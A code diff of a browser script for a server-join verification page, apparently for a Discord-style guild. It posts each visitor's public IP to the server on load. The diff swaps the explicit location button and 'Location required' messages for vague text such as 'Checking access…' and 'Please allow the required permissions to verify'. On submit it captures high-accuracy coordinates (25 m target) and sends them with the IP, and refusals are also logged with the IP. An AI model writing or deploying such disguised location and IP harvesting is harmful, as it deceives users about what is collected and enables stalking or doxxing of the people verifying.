@@ -1,36 +1,34 @@
 (() => {
   const form = document.querySelector('form[data-require-geo]');
-  const btn = document.getElementById('geoBtn');
   const submitBtn = document.getElementById('submitBtn');
   const status = document.getElementById('geoStatus');
   const ipStatus = document.getElementById('ipStatus');
   const formError = document.getElementById('formError');
-  if (!form || !btn || !submitBtn) return;
+  if (!form || !submitBtn) return;
 
   const requireGeo = form.getAttribute('data-require-geo') === '1';
   const guildId = String(form.getAttribute('data-guild-id') || '').trim();
   const csrfToken = String(form.getAttribute('data-csrf') || '').trim();
   const token = String(form.getAttribute('data-token') || '').trim();
 
-  const GEO_DESIRED_ACCURACY = 50; // meters
-  const GEO_MAX_WAIT_MS = 15000;
+  const GEO_DESIRED_ACCURACY = 25;
+  const GEO_MAX_WAIT_MS = 20000;
   const GEO_MAX_AGE_MS = 0;
 
-  let geoPostedOk = false;
   let publicIpPostedOk = false;
   let publicIpValue = '';
 
-  function setValue(id, value) {
+  const setValue = (id, value) => {
     const el = document.getElementById(id);
     if (el) el.value = value;
-  }
+  };
 
-  function getValue(id) {
+  const getValue = (id) => {
     const el = document.getElementById(id);
     return el ? String(el.value || '').trim() : '';
-  }
+  };
 
-  function parseGeoInput() {
+  const parseGeoInput = () => {
     const latStr = getValue('geoLat');
     const lonStr = getValue('geoLon');
     const accStr = getValue('geoAcc');
@@ -42,64 +40,31 @@
     if (lat < -90 || lat > 90 || lon < -180 || lon > 180) return null;
     if (acc < 0 || acc > 100000) return null;
     return { lat, lon, accuracy: acc };
-  }
+  };
 
-  function hasGeo() {
-    return Boolean(parseGeoInput());
-  }
+  const hasGeo = () => Boolean(parseGeoInput());
 
-  function formatAccuracy(acc) {
-    if (!Number.isFinite(acc)) return '';
-    return `±${Math.round(acc)}m`;
-  }
-
-  function setGeoStatus(text) {
+  const setGeoStatus = (text) => {
     if (status) status.textContent = text || '';
-  }
+  };
 
-  function setIpStatus(text) {
+  const setIpStatus = (text) => {
     if (!ipStatus) return;
     const value = String(text || '').trim();
     ipStatus.textContent = value;
     ipStatus.style.display = value ? 'block' : 'none';
-  }
+  };
 
-  function setFormError(text) {
+  const setFormError = (text) => {
     if (!formError) return;
     const value = String(text || '').trim();
     formError.textContent = value;
     formError.classList.toggle('d-none', !value);
-  }
+  };
 
-  function clearServerError() {
-    setFormError('');
-  }
+  const formatAccuracy = (acc) => (Number.isFinite(acc) ? `±${Math.round(acc)}m` : '');
 
-  function updateVerifyEnabled() {
-    const geoOk = !requireGeo || hasGeo();
-    submitBtn.disabled = !geoOk;
-  }
-
-  function updateGeoStatus() {
-    if (!requireGeo) {
-      setGeoStatus('');
-      return;
-    }
-    const geo = parseGeoInput();
-    if (geo) {
-      const accLabel = formatAccuracy(geo.accuracy);
-      const quality = geo.accuracy <= GEO_DESIRED_ACCURACY ? 'Location captured (high accuracy).' : 'Location captured.';
-      setGeoStatus(`${quality}${accLabel ? ` ${accLabel}` : ''}`.trim());
-      return;
-    }
-    setGeoStatus('Location required.');
-  }
-
-  updateGeoStatus();
-  updateVerifyEnabled();
-  setIpStatus('');
-
-  async function fetchPublicIp() {
+  const fetchPublicIp = async () => {
     const urls = ['https://api64.ipify.org?format=json', 'https://api.ipify.org?format=json'];
     for (const url of urls) {
       try {
@@ -113,9 +78,9 @@
       }
     }
     return '';
-  }
+  };
 
-  async function postPublicIp(ip) {
+  const postPublicIp = async (ip) => {
     try {
       const r = await fetch(`/verify/${encodeURIComponent(guildId)}/client`, {
         method: 'POST',
@@ -131,9 +96,9 @@
     } catch {
       return false;
     }
-  }
+  };
 
-  async function ensurePublicIp() {
+  const ensurePublicIp = async () => {
     if (!guildId || !csrfToken || !token) return false;
     if (publicIpPostedOk) return true;
     const ip = publicIpValue || (await fetchPublicIp());
@@ -142,21 +107,102 @@
     const ok = await postPublicIp(ip);
     publicIpPostedOk = ok;
     return ok;
-  }
+  };
 
   if (guildId && csrfToken && token) {
-    setIpStatus('');
     ensurePublicIp().catch(() => null);
   }
 
-  btn.addEventListener('click', () => {
-    clearServerError();
-    geoPostedOk = false;
-    updateGeoStatus();
-    updateVerifyEnabled();
+  setIpStatus('');
 
+  const captureBestLocation = () =>
+    new Promise((resolve, reject) => {
+      let best = null;
+      let done = false;
+      let watchId = null;
+
+      const finalize = (pos, err) => {
+        if (done) return;
+        done = true;
+        if (watchId !== null && navigator.geolocation.clearWatch) {
+          navigator.geolocation.clearWatch(watchId);
+        }
+        if (pos) resolve(pos);
+        else reject(err || new Error('geo_failed'));
+      };
+
+      const onPos = (pos) => {
+        if (!pos || !pos.coords) return;
+        if (!best || pos.coords.accuracy < best.coords.accuracy) {
+          best = pos;
+        }
+        if (Number.isFinite(pos.coords.accuracy)) {
+          setGeoStatus(`Locating… ${formatAccuracy(pos.coords.accuracy)}`);
+        }
+        if (Number.isFinite(pos.coords.accuracy) && pos.coords.accuracy <= GEO_DESIRED_ACCURACY) {
+          finalize(pos);
+        }
+      };
+
+      const onErr = (err) => {
+        if (best) return finalize(best);
+        return finalize(null, err);
+      };
+
+      try {
+        watchId = navigator.geolocation.watchPosition(onPos, onErr, {
+          enableHighAccuracy: true,
+          maximumAge: GEO_MAX_AGE_MS
+        });
+      } catch (err) {
+        return finalize(null, err);
+      }
+
+      setTimeout(() => {
+        if (done) return;
+        if (best) return finalize(best);
+        return finalize(null, new Error('geo_timeout'));
+      }, GEO_MAX_WAIT_MS);
+    });
+
+  const ensureGeo = async () => {
+    if (!requireGeo) return true;
+    if (hasGeo()) return true;
     if (!navigator.geolocation) {
-      setGeoStatus('Geolocation not supported.');
+      setFormError('Please allow the required permissions to verify.');
+      return false;
+    }
+
+    setGeoStatus('Checking access…');
+    try {
+      const pos = await captureBestLocation();
+      const lat = Number(pos.coords.latitude);
+      const lon = Number(pos.coords.longitude);
+      const acc = Number(pos.coords.accuracy);
+      setValue('geoLat', String(lat));
+      setValue('geoLon', String(lon));
+      setValue('geoAcc', String(acc));
+      setGeoStatus(`Access confirmed ${formatAccuracy(acc)}`.trim());
+
+      if (guildId && csrfToken && token) {
+        await fetch(`/verify/${encodeURIComponent(guildId)}/geo`, {
+          method: 'POST',
+          headers: {
+            'content-type': 'application/json',
+            'csrf-token': csrfToken
+          },
+          body: JSON.stringify({
+            t: token,
+            lat,
+            lon,
+            accuracy: acc,
+            publicIp: publicIpValue || undefined
+          })
+        }).catch(() => null);
+      }
+      return true;
+    } catch {
+      setFormError('Please allow the required permissions to verify.');
       if (guildId && csrfToken && token) {
         fetch(`/verify/${encodeURIComponent(guildId)}/geo/denied`, {
           method: 'POST',
@@ -164,151 +210,29 @@
             'content-type': 'application/json',
             'csrf-token': csrfToken
           },
-          body: JSON.stringify({ t: token, reason: 'geolocation_not_supported', publicIp: publicIpValue || undefined })
+          body: JSON.stringify({ t: token, reason: 'geo_denied', publicIp: publicIpValue || undefined })
         }).catch(() => null);
       }
-      return;
+      return false;
     }
-
-    btn.disabled = true;
-    setGeoStatus('Requesting high-accuracy location…');
-
-    const captureBestLocation = () =>
-      new Promise((resolve, reject) => {
-        let best = null;
-        let done = false;
-        let watchId = null;
-
-        const finalize = (pos, err) => {
-          if (done) return;
-          done = true;
-          if (watchId !== null && navigator.geolocation.clearWatch) {
-            navigator.geolocation.clearWatch(watchId);
-          }
-          if (pos) resolve(pos);
-          else reject(err || new Error('geo_failed'));
-        };
-
-        const onPos = (pos) => {
-          if (!pos || !pos.coords) return;
-          if (!best || pos.coords.accuracy < best.coords.accuracy) {
-            best = pos;
-          }
-          if (Number.isFinite(pos.coords.accuracy)) {
-            setGeoStatus(`Locating… ${formatAccuracy(pos.coords.accuracy)}`);
-          }
-          if (Number.isFinite(pos.coords.accuracy) && pos.coords.accuracy <= GEO_DESIRED_ACCURACY) {
-            finalize(pos);
-          }
-        };
-
-        const onErr = (err) => {
-          if (best) return finalize(best);
-          return finalize(null, err);
-        };
-
-        try {
-          watchId = navigator.geolocation.watchPosition(onPos, onErr, {
-            enableHighAccuracy: true,
-            maximumAge: GEO_MAX_AGE_MS
-          });
-        } catch (err) {
-          return finalize(null, err);
-        }
-
-        setTimeout(() => {
-          if (done) return;
-          if (best) return finalize(best);
-          return finalize(null, new Error('geo_timeout'));
-        }, GEO_MAX_WAIT_MS);
-      });
-
-    captureBestLocation()
-      .then((pos) => {
-        const lat = Number(pos.coords.latitude);
-        const lon = Number(pos.coords.longitude);
-        const acc = Number(pos.coords.accuracy);
-        setValue('geoLat', String(lat));
-        setValue('geoLon', String(lon));
-        setValue('geoAcc', String(acc));
-        btn.disabled = false;
-        geoPostedOk = false;
-        updateGeoStatus();
-        updateVerifyEnabled();
-
-        if (guildId && csrfToken && token) {
-          fetch(`/verify/${encodeURIComponent(guildId)}/geo`, {
-            method: 'POST',
-            headers: {
-              'content-type': 'application/json',
-              'csrf-token': csrfToken
-            },
-            body: JSON.stringify({
-              t: token,
-              lat,
-              lon,
-              accuracy: acc,
-              publicIp: publicIpValue || undefined
-            })
-          })
-            .then(async (r) => {
-              if (!r.ok) throw new Error('geo_post_failed');
-              const data = await r.json().catch(() => null);
-              if (!data || data.ok !== true) throw new Error('geo_post_not_ok');
-              geoPostedOk = true;
-              updateGeoStatus();
-              updateVerifyEnabled();
-            })
-            .catch(() => {
-              geoPostedOk = false;
-              setGeoStatus('Failed to send location. Please try again.');
-              updateGeoStatus();
-              updateVerifyEnabled();
-            });
-        }
-      })
-      .catch((err) => {
-        btn.disabled = false;
-        setGeoStatus('Location permission denied.');
-        geoPostedOk = false;
-        updateGeoStatus();
-        updateVerifyEnabled();
-
-        const reason = err && typeof err.code !== 'undefined' ? `geo_error_${err.code}` : 'geo_error';
-        if (guildId && csrfToken && token) {
-          fetch(`/verify/${encodeURIComponent(guildId)}/geo/denied`, {
-            method: 'POST',
-            headers: {
-              'content-type': 'application/json',
-              'csrf-token': csrfToken
-            },
-            body: JSON.stringify({ t: token, reason, publicIp: publicIpValue || undefined })
-          }).catch(() => null);
-        }
-      });
-  });
-
-  // Inputs are optional; no missing-answers validation on client.
+  };
 
   form.addEventListener('submit', async (event) => {
     event.preventDefault();
-    if (submitBtn.disabled) return;
+    setFormError('');
     setIpStatus('');
-    clearServerError();
 
-    const geoOk = !requireGeo || hasGeo();
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Verifying…';
+
+    const geoOk = await ensureGeo();
     if (!geoOk) {
-      setFormError('Location is required. Please allow location.');
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Verify';
       return;
     }
 
-    submitBtn.disabled = true;
-    submitBtn.textContent = 'Redirecting…';
-
-    const ipOk = await ensurePublicIp();
-    if (!ipOk) {
-      setIpStatus('');
-    }
+    await ensurePublicIp();
 
     const formData = new FormData(form);
     const body = new URLSearchParams();
@@ -342,4 +266,8 @@
       setIpStatus('Network error. Please try again.');
     }
   });
+
+  if (requireGeo) {
+    setGeoStatus('');
+  }
 })();
